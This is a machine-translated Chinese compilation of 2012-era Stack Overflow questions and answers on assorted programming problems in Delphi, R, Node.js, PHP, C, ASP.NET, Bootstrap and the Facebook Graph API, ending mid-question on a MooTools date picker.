> 标签：delphi

我已经[**从这里**](https://stackoverflow.com/a/10485597/960757)和以下部分测试了代码

```
begin 
  Paths := TStringList.Create(); 
  try 
    ParseInfFile(LocateInfFile(DeviceHelper.InfName), DeviceHelper.InfSection)
  ...
... 
```

编译时...

```
Undeclared identifier InfName and InfSection 
```

我该如何解决？还有其他适当的变体吗？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-08-11T21:42:54.357

`DeviceHelper`似乎是链接代码中未包含的类或记录，但除了您发布的行之外，它也没有在其他任何地方使用（为了方便其他人，我将在该代码的最底部提及） . 因此，您可以将它们声明为局部变量，为`InfName`and分配您想要的值`InfSection`，然后继续`DeviceHelper`：

```
var
  InfName, InfSection: string;
begin
  InfName := 'WhatEver.Inf';
  InfSection := 'WhatEverSection`;
  Paths := TStringList.Create(); 
  try 
    ParseInfFile(LocateInfFile(InfName), InfSection);
  ...

  // You'll need to remove these lines, too. They add the returned items
  // to a TListView using functionality that's available in Vista and above
  ListView_InsertGroup(lvAdvancedInfo.Handle, 'Driver Files', 2);
  for I := 0 to Paths.Count - 1 do
     ListView_AddItemsInGroup(lvAdvancedInfo, '', Paths[I], 2); 
```

# r - 运行 R 脚本时出错

> ID：11917192
> 
> 赞同：0
> 
> 时间：2012-08-11T19:58:05.413
> 
> 标签：r

当我运行我的 R 脚本时，它给了我一个错误：

```
Error in list.files(lib, pattern = paste0("^", pkg, "$"), full.names = TRUE) : 
  invalid 'pattern' regular expression 
```

这个错误是什么意思？脚本的链接是： http: [//mzmatch.sourceforge.net/metabolomics/Processing_Code.R](http://mzmatch.sourceforge.net/metabolomics/Processing_Code.R)

但我一开始就改了几行：

```
library ("D:\\java projects\\RScriptRunning\\R\\win-library\\2.15\\mzmatch.R")
mzmatch.init (6000)
setwd ("D:\\R_Script\\raw") 
```

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-08-11T20:41:09.957

**完全重写了**我的答案，因为[第一个版本](https://stackoverflow.com/posts/11917487/revisions)错过了相关点。

当您阅读这样的错误消息时，调用`traceback()`将告诉您*错误*发生的位置。在这种情况下，它很可能会识别`find.package`函数，该函数以某种方式从`library`函数中调用。它从包名构造路径名，并且不对包名进行转义。因此，在正则表达式中具有特殊含义的符号（可能是反斜杠）将使该正则表达式无效，从而导致错误消息。

原因是您尝试使用其中一个文件的完整路径名加载库。**库仅按包名称加载**（最有可能`library(mzmatch)`在您的情况下）。您可以使用`source("C:\\some\\path")`从给定路径加载和执行 R 源代码，但我不建议对已安装的库这样做。

# javascript - 如何正确地使 node.js 中的数据库流动

> ID：11917194
> 
> 赞同：0
> 
> 时间：2012-08-11T19:58:16.290
> 
> 标签：javascript, mysql, multithreading, node.js

我是 node.js 世界的新手，所以我的问题对你来说可能很奇怪。我有一个非常简单的场景：1）在数据库中插入行，获取该行的 ID 2）插入多个行，每个行都使用我们之前获得的 ID

流程存在问题...在我们从阶段 1 获得响应之前开始阶段 2，或者在我们完成插入之前完成所有阶段（调用 connection.end()）。

我尝试使用异步模块，但它对我没有帮助让我们看看代码：

```
// open connection

conn.query('INSERT INTO receipt SET ?', {postid: postGUID, body: body}, function(err, result) {
    if (err) throw err;
        console.log("ID: "+result.insertId );

    conn.query('INSERT INTO imgs SET ?', {postid: result.insertId, link: imgSrc}, function(err, result) {
        if (err) throw err;

    });
});

conn.end( function(err) {
    console.log("CLOSE CONNECTION"); 
    console.log(err);
}); 
```

你能帮我吗？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-08-11T21:05:27.180

由于 conn.query 很可能是异步的，因此您在完成查询之前关闭连接。快速修复可能如下。

```
conn.query('INSERT INTO receipt SET ?', {postid: postGUID, body: body}, function(err, result) {
    if (err) throw err;
        console.log("ID: "+result.insertId );

    conn.query('INSERT INTO imgs SET ?', {postid: result.insertId, link: imgSrc}, function(err, result) {
        if (err) throw err;

       conn.end( function(err) {
          console.log("CLOSE CONNECTION"); 
          console.log(err);
       });
   });
}); 
```

更好的解决方法可能是在进程结束时关闭连接。

# objective-c - OSX SDK 上的文件管理器类？

> ID：11917198
> 
> 赞同：0
> 
> 时间：2012-08-11T19:58:44.177
> 
> 标签：objective-c, macos, cocoa, file-management

> **可能重复：**
> [显示文件选择器对话框](https://stackoverflow.com/questions/5126594/display-file-chooser-dialog)

文件管理器 GUI 的名称是什么。就像您在程序上另存为并且文件管理器出现时一样。我说的是 OSX 10.5 及更高版本。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-08-12T22:39:38.337

> 当您另存为程序并出现文件管理器时

你会用`NSSavePanel`这个。

如果您只是想打开一个文档或选择一个目录，那么您将使用`NSSavePanel's`subclass - `NSOpenPanel`。

# rabbitmq - 生产者/消费者的不同语言

> ID：11917199
> 
> 赞同：3
> 
> 时间：2012-08-11T19:58:44.690
> 
> 标签：rabbitmq, amqp

我想知道是否可以通过 AMQP 和 RabbitMQ 为生产者和消费者使用不同的语言？

例如：Java 用于生产者，python/php 用于消费者，反之亦然？

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2012-08-12T01:13:49.610

是的，AMQP 与语言无关，这意味着只要您有可以连接到**同一个**RabbitMQ 服务器的客户端，您就应该能够在它们之间进行通信。[幸运的是，已经有可用多种语言编写的 RabbitMQ 客户端，包括 Java、Python 和 PHP](http://www.rabbitmq.com/devtools.html)。

# php - 如何匹配所有以“dynamic_key”开头但提取结尾“single_name”并将其保存到数组中的值？

> ID：11917202
> 
> 赞同：0
> 
> 时间：2012-08-11T19:59:15.343
> 
> 标签：php, regex, preg-match-all

我有一个具有多重值的数据库值。我想要的是这样的部分：

```
"dynamic_key";s:11:"single_name" 
```

如何匹配以“dynamic_key”开头但提取并保存结尾“single_name”的所有值到数组中？

例如：

> "save_to_database";b:0;s:21:"dynamic_default_value";b:1;s:11:"dynamic_key";s:2:"id";}i:1;a: 8:
> {s:2:"id";i:36;s:4:"type";s:6:"hidden";s:5:"label";s:10:"user_login";s:13:" default_value";s:12:"{user_login}";s:9:"is_hidden";b:0;s:16:"save_to_database";b:0;s:21:"dynamic_default_value";b:0;s :11:"dynamic_key";s:0:"";}i:2;a:28:{s:2:"id";i:1;s:4:"type";s:4:"text ";s:5:"标签";s:15:"שם האומן";s:11:"描述";s:0:"";s:8:"必需";b:0;s:13: "default_value";s:0:"";s:7:"工具提示";s:0:"";s:19:"clear_default_value";b:0;s:19:"reset_default_value";b:1; s:11:"admin_label";s:0:"";s:16:"required_message";s:0:"";s:9:"is_hidden";b:0;s:16:"save_to_database";b:0;s:15:"label_placement";s:7:"inherit";s:11:"label_width";s:0:"";s:12:"tooltip_type";s:7: "继承";s:13:"工具提示事件";s:7:"继承";s:18:"prevent_duplicates";b:0;s:23:"duplicate_found_message";s:0:"";s:5 :"logic";b:0;s:12:"logic_action";s:4:"show";s:11:"logic_match";s:3:"all";s:11:"logic_rules";a :0:{}s:21:"dynamic_default_value";b:1;s:11:"dynamic_key";s:11:"artist_name";s:6:"styles";a:0:{}s:7 :"过滤器";a:1:{i:0;a:4:tooltip_event";s:7:"继承";s:18:"prevent_duplicates";b:0;s:23:"duplicate_found_message";s:0:"";s:5:"逻辑";b:0; s:12:"logic_action";s:4:"show";s:11:"logic_match";s:3:"all";s:11:"logic_rules";a:0:{}s:21: "dynamic_default_value";b:1;s:11:"dynamic_key";s:11:"artist_name";s:6:"styles";a:0:{}s:7:"filters";a:1: {i:0;a:4:tooltip_event";s:7:"继承";s:18:"prevent_duplicates";b:0;s:23:"duplicate_found_message";s:0:"";s:5:"逻辑";b:0; s:12:"logic_action";s:4:"show";s:11:"logic_match";s:3:"all";s:11:"logic_rules";a:0:{}s:21: "dynamic_default_value";b:1;s:11:"dynamic_key";s:11:"artist_name";s:6:"styles";a:0:{}s:7:"filters";a:1: {i:0;a:4:艺术家名称";s:6:"styles";a:0:{}s:7:"过滤器";a:1:{i:0;a:4:艺术家名称";s:6:"styles";a:0:{}s:7:"过滤器";a:1:{i:0;a:4:

因此，如果我在此文本上运行 preg_match_all 我将有一个包含：`id`,的数组`artist_name`。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-08-11T20:43:00.713

您看到的是序列化的 PHP 数据。您可以使用 PHP 函数对其进行反序列化[`unserialize`](http://php.net/unserialize)（大吃一惊）。

不过要小心用户数据，因为在反序列化期间可能会执行恶意代码。

# java - 用于测试分布式系统的集成测试框架？

> ID：11917207
> 
> 赞同：13
> 
> 时间：2012-08-11T20:00:21.460
> 
> 标签：java, ruby, tdd, integration-testing

我有一个分布式系统，其组件分布在多个盒子中。它们使用 tcp 或多播相互通信。每个组件相互交换消息——这些基本上是被序列化的数据结构。

我们有哪些集成测试框架来测试这样的系统？我对红宝石很熟悉，所以基于红宝石的东西肯定会有所帮助。

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2013-02-03T15:39:31.410

我想有不同的方法可以做到这一点。我尽量避免集成测试，但在某些时候当然需要。这只是我会做的一个建议：

1.  使用[行为驱动的方法](http://en.wikipedia.org/wiki/Behavior-driven_development)可以清楚地定义您想要测试的场景。
2.  [对代表模块输出的过程进行单元测试](http://en.wikipedia.org/wiki/Unit_testing)（无[集成](http://en.wikipedia.org/wiki/Integration_testing)）。
3.  单元测试应该使用来自其他模块的输入的过程，但使用[mocks](http://en.wikipedia.org/wiki/Mock_object)。测试当前另一个模块的逻辑。
4.  执行[冒烟测试](http://en.wikipedia.org/wiki/Smoke_testing)，这种类型的测试将确保您的模块之间可以相互通信（这是一种集成测试）。我认为冒烟测试就足够了集成测试。如果你想一想：为什么模块上会关心其他模块做什么？（让每个部分做他们想做的事，但只关心如何与他们沟通）

就我个人而言，我认为在测试方法中将对象从一个分布式模块调用到另一个分布式模块不是一个好习惯。是的，这将是一个集成测试，但我认为它非常容易可靠。

始终牢记测试金字塔，记住集成测试和端到端测试可能非常昂贵。因此，明智地选择何时使用它们：

![在此处输入图像描述](../Images/e510376c20e7b1bac83399d1c340ea08.png)

我来自 Java 世界，以下只是一些额外的信息，我认为这些信息也与该主题相关，您可能会感兴趣：

*   [数据传输对象](http://en.wikipedia.org/wiki/Data_transfer_object)模式，很有趣
*   [RMI vs EJB vs HTTP](http://forum.springsource.org/showthread.php?59380-RMI-vs-EJB-vs-HTTP)（关于远程调用技术之间差异的一些有趣的评论）
*   [Spock](http://code.google.com/p/spock/)为 Java 开发人员提供 BDD 框架。（如果您完全理解业务规则，那么测试会更容易）

希望你觉得它有用。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2015-03-15T23:40:01.547

您可以查看 Zopkio：[https](https://github.com/linkedin/Zopkio) ://github.com/linkedin/Zopkio 。它是一个用于分布式系统功能和性能测试的开源框架。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2014-05-27T04:40:21.763

您可以使用 STAF/STAX，它为客户端-服务器、SAN 等分布式测试场景提供了良好的功能/服务。此外，还有一个由 Luxoft 命名的框架 Twister。这个也很精彩。

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2015-02-24T03:39:11.897

我将为我们使用 Java 编写的分布式系统所做的事情给出答案。我们有多个 linux 守护进程，它们实际上是围绕 java 程序的包装器，它们主要通过数据库相互通信。所以他们不会来回发送序列化消息。我们使用 dbunit 和 spring-test 进行集成测试。使用 dbunit，您基本上可以加载数据，运行您的被测系统 (SUT)，然后验证数据库是否处于正确状态。spring-test 使基于 spring 的应用程序在测试时可以轻松加载应用程序上下文。

如果您没有基于 Java 的应用程序，那么这可能没有那么有用。框架选择在很大程度上取决于您的技术选择和架构。

# javascript - 使用“ for (i = 0; elem = array[i]; i++)” 迭代数组有什么风险吗？

> ID：11917210
> 
> 赞同：0
> 
> 时间：2012-08-11T20:00:48.043
> 
> 标签：javascript

因为我发现了这个片段，所以我经常使用它来迭代数组：

```
for (i = 0; elem = array[i]; i++) doStuff(elem); 
```

如果`array`可以包含任何评估为假的东西（`''`, `undefined`, `null`, `0`, `false`），显然是非常错误的。但是，如果您确定不是这种情况，是否有人看到使用这种方法的另一个风险？

我问这个，因为它似乎不是很常用，虽然它对我来说真的很棒，所以我开始认为我错过了一个明显的缺点。

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2012-08-11T20:05:17.163

你知道缺点，只要你能忍受它们......

另一种没有缺点的方法可能是

```
for (var i = 0, l = array.length, elem; i < l; elem = array[i++]) 
```

但它可能更模糊。

* * *

## 回答 #2

> 赞同：5
> 
> 时间：2012-08-11T20:06:19.410

我认为至少有两个主要缺点：

*   您已经提到的第一个：如果数组包含虚假值，则它不起作用。您不能总是确定没有任何元素是虚假的，无论是现在*还是将来*，随着新功能的添加。
*   二是*不规范*、*混乱*。它会让其他必须维护您的代码的开发人员摸不着头脑，试图弄清楚您为什么这样做而不是正常循环。或者他们可能会将其误读为`elem == array[i]`.

保持简单，对你自己和你的同事都是如此。

```
for (var i = 0; i < array.length; i++) {
    var elem = array[i];
    doStuff(elem);
} 
```

# asp.net - 为什么在 ASP.Net 中向 StatusDescription 添加换行符会关闭连接？

> ID：11917212
> 
> 赞同：11
> 
> 时间：2012-08-11T20:00:58.053
> 
> 标签：asp.net, asp.net-mvc-3

当我使用 ASP.Net MVC 3.0 中的 HttpStatusCodeResult 返回带有换行符的 StatusDescription 时，与我的客户端的连接被强制关闭。应用程序托管在 IIS 7.0 中。

示例控制器：

```
 public class FooController : Controller
 {
    public ActionResult MyAction()
    {
       return new HttpStatusCodeResult((int)HttpStatusCode.BadRequest, "Foo \n Bar");
    }
 } 
```

示例客户端：

```
using (WebClient client = new WebClient())
{
   client.DownloadString("http://localhost/app/Foo/MyAction");
} 
```

抛出异常：

```
System.Net.WebException: The underlying connection was closed: An unexpected error occurred on a receive. 
  System.IO.IOException: Unable to read data from the transport connection: An existing connection was forcibly closed by the remote host.
    System.Net.Sockets.SocketException: An existing connection was forcibly closed by the remote host 
```

使用 curl (curl 7.25.0 (i386-pc-win32) libcurl/7.25.0 zlib/1.2.6) 时的行为是一致的

> `curl http://localhost/app/Foo/MyAction`

curl：（56）接收失败：连接已重置

编辑

我最终使用此自定义 ActionResult 来获得所需的结果。

```
public class BadRequestResult : ActionResult
{
   private const int BadRequestCode = (int)HttpStatusCode.BadRequest;
   private int count = 0;

   public BadRequestResult(string errors)
      : this(errors, "")
   {
   }

   public BadRequestResult(string format, params object[] args)
   {
      if (String.IsNullOrEmpty(format))
      {
         throw new ArgumentException("format");
      }

      Errors = String.Format(format, args);

      count = Errors.Split(new string[] { Environment.NewLine }, StringSplitOptions.RemoveEmptyEntries).Length;
   }

   public string Errors { get; private set; }

   public override void ExecuteResult(ControllerContext context)
   {
      if (context == null)
      {
         throw new ArgumentNullException("context");
      }

      HttpResponseBase response = context.HttpContext.Response;
      response.TrySkipIisCustomErrors = true;
      response.StatusCode = BadRequestCode;
      response.StatusDescription = String.Format("Bad Request {0} Error(s)", count);
      response.Write(Errors);
      response.End();
   }
} 
```

* * *

## 回答 #1

> 赞同：15
> 
> 时间：2012-08-11T20:06:38.330

HTTP 标头中间不能有换行符。

HTTP 协议指定标头的结尾是换行符。

由于换行符位于标头中间，因此标头不是有效标头，您会收到此错误。

修复：不要在 HTTP 标头中间放置换行符。

# jquery - 根据窗口大小动态更改类名

> ID：11917216
> 
> 赞同：13
> 
> 时间：2012-08-11T20:01:38.290
> 
> 标签：jquery, css, twitter-bootstrap

我正在使用 Twitter Bootstrap 创建一个使用以下布局的响应式站点（针对此问题进行了简化）：

```
<div class="container-fluid">
    <div class="row-fluid">
        <!-- Left menu -->
        <div class="span2">
            <div class="sidebar-nav">
                MENU CONTENT GOES HERE
            </div>
        </div>

        <!-- Content -->
        <div id="mainContent" class="span7">
            MAIN CONTENT GOES HERE
        </div>

        <!-- Right column -->
        <div id="rightColumn" class="span3 hidden-phone hidden-tablet">
            RIGHT COLUMN GOES HERE
        </div>
    </div>
</div> 
```

当浏览器窗口调整为平板电脑大小时，rightColumn div 会按预期隐藏 - 但它会在 mainContent div 旁边留下空白（大小为 span3）。

我希望 mainContent div 扩展为全宽（因此它填充匹配 span10 的大小）。

我正在使用以下 jQuery 代码动态更改 mainContent div 的类名以实现此目的（并且它按预期工作）：

```
$(document).ready(function() {
    var $window = $(window);

        // Function to handle changes to style classes based on window width
        function checkWidth() {
        if ($window.width() < 980) {
            $('#mainContent').removeClass('span7').addClass('span10');
            };

        if ($window.width() >= 980) {
            $('#mainContent').removeClass('span10').addClass('span7');
        }
    }

    // Execute on load
    checkWidth();

    // Bind event listener
        $(window).resize(checkWidth);
}); 
```

我的问题：当浏览器窗口调整大小时，这是在 Twitter Bootstrap 中处理跨度更改的首选方法吗？或者我应该只更改平板电脑屏幕尺寸的 span7 的 CSS 以匹配 span10？

* * *

## 回答 #1

> 赞同：17
> 
> 时间：2012-08-11T20:35:08.960

我自己来回答：我删除了 Javascript 代码，并用对 Bootstrap CSS 的这个简单更改来替换它，以将 span7 的宽度更改为与平板电脑屏幕尺寸的 span10 相同的宽度：

```
@media (max-width: 979px) and (min-width: 768px) {
    .row-fluid .span7 {
    width: 82.87292817100001%;
    }
} 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-06-07T14:49:37.743

但媒体查询不适用于 ie8 及以下版本。我认为你最好用js修复。话又说回来，ie8 无论如何都不会隐藏 span3。

但这是我使用的。当您从该 div 中删除类 span7 时，它会自动占用剩余宽度的 100%，假设您没有专门设置 #mainContent 宽度的样式

```
<div class="container-fluid">
    <div class="row-fluid">
        <!-- Left menu -->
        <div class="span2">
            <div class="sidebar-nav">
                MENU CONTENT GOES HERE
            </div>
        </div>

        <!-- Content -->
        <div id="mainContent" class=""> <!-------------remove the span7---->
            MAIN CONTENT GOES HERE
        </div>

        <!-- Right column -->
        <div id="rightColumn" class="span3 hidden-phone hidden-tablet">
            RIGHT COLUMN GOES HERE
        </div>
    </div>
</div> 
```

# facebook-graph-api - 通过图形 api 访问全尺寸 (851x315) 时间轴封面照片

> ID：11917221
> 
> 赞同：5
> 
> 时间：2012-08-11T20:02:39.047
> 
> 标签：facebook-graph-api

我注意到，当我通过 Graph API（使用 PHP）访问时间线封面照片 URL 时，返回的照片是 720x266 而不是 851x315。要么使用，要么通过访问访问时返回的json数组`<graph api url>/userId/?field=cover`中的url`['cover']['source']``<graph api url>/userID`

我一直无法找到检索全尺寸封面照片的方法。使用萤火虫我可以看到 Facebook 加载全尺寸 851x315 图像，URL 的唯一区别似乎是 API 返回的路径中有 720x720，

## Facebook 加载的内容：

> [http://a3.sphotos.ak.fbcdn.net/hphotos-ak-prn1/xxxxxx_xxxxxxxxxxxxxxx_xxxxxxxxxx_n.jpg](http://a3.sphotos.ak.fbcdn.net/hphotos-ak-prn1/xxxxxx_xxxxxxxxxxxxxxx_xxxxxxxxxx_n.jpg)

## Graph API 返回的内容

> [http://a3.sphotos.ak.fbcdn.net/hphotos-ak-prn1/s720x720/xxxxxx_xxxxxxxxxxxxxxx_xxxxxxxxxx_n.jpg](http://a3.sphotos.ak.fbcdn.net/hphotos-ak-prn1/s720x720/xxxxxx_xxxxxxxxxxxxxxx_xxxxxxxxxx_n.jpg)

有没有办法可以直接访问该全尺寸封面照片 URL？我可以解析 API 返回的 URL 以去除 720x720，但我希望这是直接获取全尺寸封面照片 URL 的更优雅的方式。

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2013-01-16T13:08:21.353

# 访问 facebook 用户的全尺寸时间线封面照片

* * *

在 php 中，我们可以执行以下操作。它是一个小技巧，我不保证它会终生使用。

如您所见，`s720x720`返回的照片网址中有一个。现在我们将用 `l720`(L720) 替换它。借助 php 中的 preg_replace() 。

* * *

```
$coverphoto_url="https://a3.sphotos.ak.fbcdn.net/hphotos-ak-prn1/s720x720/xxxxxx_xxxxxxxxxxxxxxx_xxxxxxxxxx_n.jpg";

$coverphoto_url = preg_replace('/s720/i','l720',$coverphoto_url); 
```

* * *

这将返回，

> https://a3.sphotos.ak.fbcdn.net/hphotos-ak-prn1/l720x720 **/xxxxxx_xxxxxxxxxxxxxxx_xxxxxxxxxx_n.jpg** _

* * *

您也可以使用 javascript 执行此操作。

```
coverphoto_url = coverphoto_url.replace(/s720/i, 'l720'); 
```

* * *

如果您不知道如何通过图形 API 检索封面照片，请阅读此问题。

[如何获取安全封面 URL？](https://stackoverflow.com/questions/13702442/how-to-get-a-securl-cover-url/14355991#14355991)

希望这可以帮助某人:)

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2014-09-15T18:35:49.167

接受的答案现在被新的 Facebook Graph API 打破了，我可以使用这个函数在 JavaScript 中获得高质量的封面照片：

```
FB.api("/hawaiianchimp?fields=cover", function(response){
        FB.api("/"+response.cover.id, function(response){
            var img_src = response.images[0].source;
        });
      }); 
```

这将获取封面照片 ID，然后执行第二次 Graph API 调用以获取图像源

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2014-01-12T11:43:13.273

在我的测试中，这部分 url 是问题的症结所在： `.../c0.0.851.315/...`

因此，执行这样的请求：

```
$url = "https://graph.facebook.com/{$id}?fields=cover";

// // this points it to the actual banner, not the fullsized one 
$key_851 = 'c0.0.851.315';

$response = json_decode( file_get_contents( $url ) );

if( is_object( $response ) && property_exists( $response->cover , 'source' ) ) {
    $coverphoto_url = preg_replace( '/s720(\w*\.*)\d*(?<!\/)/i', $key_851 ,$response->cover->source );
    echo $coverphoto_url;
} 
```

# c - 从 C 中的命令行捕获可变长度字符串

> ID：11917222
> 
> 赞同：1
> 
> 时间：2012-08-11T20:02:45.320
> 
> 标签：c, stdin

我到处寻找我的问题的答案，但我还没有找到我的问题的可靠答案。

我目前正在用 C 编写一个程序，专门针对 UNIX 命令行（我使用 Linux 作为我的开发环境，但我希望这个程序尽可能地可移植）。现在，我有一个提示用户输入的基本 shell。然后用户将输入一个命令，该命令将被相应地处理。这是我到目前为止的代码：

```
/* Main.c */
int main(int argc, char **argv)
{
    while (TRUE)
    {
        display_prompt();
        get_command();
    }

    return 0;
}

/* Main.h */
void get_command()
{
    /*
     * Reads in a command from the user, outputting the correct response
     */

    int buffer_size = 20;   
    char *command = (char*) malloc(sizeof(char) * buffer_size);

    if (command == NULL)
    {
       return_error("Error allocating memory");
    }

    fgets(command, buffer_size, stdin);
    if (command[strlen(command) - 1] == '\n')
    {
        puts("It's inside the buffer.");
    }
    else
    {
        puts("It's not inside the buffer.");
    }

    free(command);
} 
```

我最初的想法是检查`\n`字符并查看它是否适合`buffer_size`，如果它不`realloc()`适合扩展分配的内存的数据。

但是，在我`realloc()`的字符串之后，我将如何将剩余的数据添加`stdin`到`command`？

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2012-08-11T21:02:39.660

如果您确实需要，请使用 getline(3)。这是 POSIX.1-2008。请注意，无限长度的行是 DOS 攻击 (OOM) 的简单攻击向量。所以考虑制定一个合理的行长限制，并使用 fgets(3)。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-08-11T20:17:02.807

您不需要执行任何重新分配，只需为 \0 添加比最大命令长度多 1 个字节并忘记 \n ，因为您不会总是得到一个 \n 用户输入输入。如果用户输入超过长度，那么您的字符串将被截断而没有 \n。因此，您在 fgets 之后的情况不正确并且基于错误的假设。

就像是：

```
 int buffer_size = MAX_COMMAND_LENGTH + 1; 
```

关于内存分配：在这种情况下，您应该使用堆栈而不是堆来避免 malloc/free。所以你的代码会更简单，更不容易出错：

```
 char command[buffer_size];
    ...
    // free(command) <-- you dont need this anymore 
```

请注意，您的命令将在函数返回后被释放。因此，如果您将其处理为 get_command 就可以了，但如果您想将其返回给调用者，您将收到来自调用者的缓冲区。

* * *

## 回答 #3

> 赞同：2
> 
> 时间：2012-08-11T20:40:55.997

我认为关于假设最大命令长度的答案是正确的：通常您希望将命令保持在合理的长度内。

但是如果你真的不能对命令的最大长度做出假设，那么你就需要缓冲。

保持：

*   一个固定`buffer`的，你总是`fgets`输入相同数量的字符，并且
*   a`command`您附加的，以及`realloc`在必要时。

以下代码可能缺少一些错误处理：

```
#define BUFFER_SIZE 20
#define COMMAND_BLOCK_SIZE 50

void get_command()
{
    char *buffer = malloc(sizeof(char) * (BUFFER_SIZE + 1));

    char *command = malloc(sizeof(char) * (COMMAND_BLOCK_SIZE + 1));
    int commandSize = 50;

    // tmp pointer for realloc:
    char *tmp = NULL;
    char *retval = NULL;

    if ((buffer == NULL) || (command == NULL))
        return_error("Error allocating memory");

    retval = fgets(buffer, BUFFER_SIZE, stdin);

    while (retval != NULL)
    {
        if (strlen(buffer) + strlen(command) > commandSize)
        {
            tmp = realloc(command, commandSize + (COMMAND_BLOCK_SIZE + 1));
            if (tmp == NULL)
                return_error("Error allocating memory");
            else
            {
                 command = tmp;
                 commandSize += COMMAND_BLOCK_SIZE;
            }
        }

        // not using strncat because the check above should guarantee that
        //    we always have more than BUFFER_SIZE more bytes in command 
        strcat(command, buffer);

        if (buffer[strlen(buffer) - 1] == '\n')
            break;

        retval = fgets(buffer, BUFFER_SIZE, stdin);
    }

    printf("COMMAND: %s\n", command);
    free(buffer);
} 
```

另请注意：

*   我们在那里没有做任何有用的事情`command`，你可能想要传入 a`char **`以便你可以`command`退出这个函数，并在调用代码中释放它，例如在你的主循环中。
*   '\n' 保留在`command`：您可能想要丢弃它。

* * *

## 回答 #4

> 赞同：2
> 
> 时间：2012-08-11T20:55:06.593

如果您使用的是 gnu 系统，请使用 c 库的[gnu`getline`扩展](http://www.gnu.org/software/libc/manual/html_node/Line-Input.html)，它会为您完成所有动态调整。

例如（虽然我没有测试过）

```
void get_command()
{
    /*
     * Reads in a command from the user, outputting the correct response
     */

    size_t buffer_size = 0;   
    char *command = NULL;

    ssize_t len = getline(&command, &buffer_size, stdin);

    if(len < 0)
    {
        perror("Error reading input");
    }
    else if (command[len - 1] == '\n')
    {
        puts("It's inside the buffer.");
    }
    else
    {
        puts("It's not inside the buffer.");
    }

    free(command);
} 
```

# c# - DefaultSettingValueAttribute 是否使用固定区域性存储 DateTime 值？

> ID：11917225
> 
> 赞同：0
> 
> 时间：2012-08-11T20:03:04.763
> 
> 标签：c#, .net, visual-studio-2010, datetime

我正要开始编写一个新的应用程序，我想弄清楚我是如何存储设置的。我几乎考虑过编写自己的设置系统，但后来决定我应该真正全面测试 .NET 提供的构建[应用程序设置](http://msdn.microsoft.com/en-us/library/k4s6c3a0.aspx)。所以我阅读了它并创建了一些测试代码。一切顺利，我想要的主要是一种重置值的方法，它可以轻松完成，但我想这样做而不自动将重置保存到设置文件中。

因此，我创建了以下代码，循环遍历设置类的每个属性，并使用默认值来更新当前值。

```
 foreach (SettingsProperty sp in Settings.Default.Properties)
        {
            PropertyInfo propertyInfo = Settings.Default.GetType().GetProperty(sp.Name);

            if (propertyInfo.CanWrite)
            {
                // Either convert from a string or de-serialize from XML
                object value;
                switch (sp.SerializeAs)
                {
                    case SettingsSerializeAs.String:
                        TypeConverter converter = TypeDescriptor.GetConverter(sp.PropertyType);
                        value = converter.ConvertFromInvariantString(sp.DefaultValue.ToString());
                        break;
                    case SettingsSerializeAs.Xml:
                        XmlSerializer serializer = new XmlSerializer(sp.PropertyType);
                        StringReader reader = new StringReader(sp.DefaultValue.ToString());
                        value = serializer.Deserialize(reader);
                        break;
                    default:
                        throw new FormatException(
                            string.Format(
                                Resources.ExceptionResetNoSaveSerializeAsInvalid,
                                sp.SerializeAs));
                }

                propertyInfo.SetValue(Settings.Default, value, null);
            }
        } 
```

我开始时没有`switch`并且只有从字符串转换的代码。我的第一次尝试使用了这个：`converter.ConvertFromString`. 这适用于纯文本甚至 GUID 值，但日期失败。
（我添加的 XML 部分使序列化内容也能正常工作，但这不是这个问题的重点）

原版`converter.ConvertFromString`在日期上失败了。在我的测试中，我使用的是 '31/08/2012 11:25'。我一直在查看 Settings.Designer.cs 文件以查看它存储默认值的位置和方式，并注意到它是如何存储上述日期的默认值的：

```
 [global::System.Configuration.DefaultSettingValueAttribute("08/31/2012 11:25:15")] 
```

我一直在网上搜索，但找不到任何参考资料来解释为什么在 Visual Studio 2010 设计器中输入 dd/mm/yyyy 格式会导致在自动生成的代码中使用 mm/dd/yyyy 格式。

正如您在上面的示例中看到的那样，我发现我可以使用`converter.ConvertFromInvariantString`并且日期错误确实消失了，但我仍然想知道是否有任何文档来解释差异。有没有其他人遇到过这个？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-08-11T20:19:36.513

是和不是。内部使用不变的文化。虽然这是一种特定的文化，但它显然不是一种真正的文化。

在内部，它使用和 之类的方法`TypeConverter.ConvertToInvariantString`从`TypeConverter.ConvertFromInvariantString`字符串中获取值。这就是字符串中的 mm/dd/yyy 的原因。当您在 UI 中输入日期/时间时，它会知道当地文化是什么，并以适合该文化的任何格式接受它。然后它在存储时“转换”为不变量。它这样做是因为它在读取值时不知道将设置什么文化。它默认为不变，因为这是一种特定且一致的文化。

就 而言`DateTime`，这既不是 UTC 也不是本地日期/时间。这允许您存储 UTC 或本地日期/时间值，您需要“转换”为`DateTime`对象，并将特定的 Kind 属性设置为您需要的任何值。建议您以 UTC 格式存储日期/时间值...

# javascript - Javascript 日期选择器 MooTools

> ID：11917228
> 
> 赞同：1
> 
> 时间：2012-08-11T20:03:41.297
> 
> 标签：javascript, css, datepicker, mootools

我正在尝试使以下演示脚本正常工作[http://www.monkeyphysics.com/mootools/script/2/](http://www.monkeyphysics.com/mootools/script/2/)

这是我的代码：

```
<style type="text/css">
// this code http://www.monkeyphysics.com/mootools/fetch/4/datepicker.css
</style>
<script src="datepicker.js"></script>  //tested in browser, correct path

<script language="javascript" type="text/javascript">window.addEvent('load', function() {
new DatePicker('.demo_vista', { pickerClass: 'datepicker_vista' });
new DatePicker('.demo_dashboard', { pickerClass: 'datepicker_dashboard' });
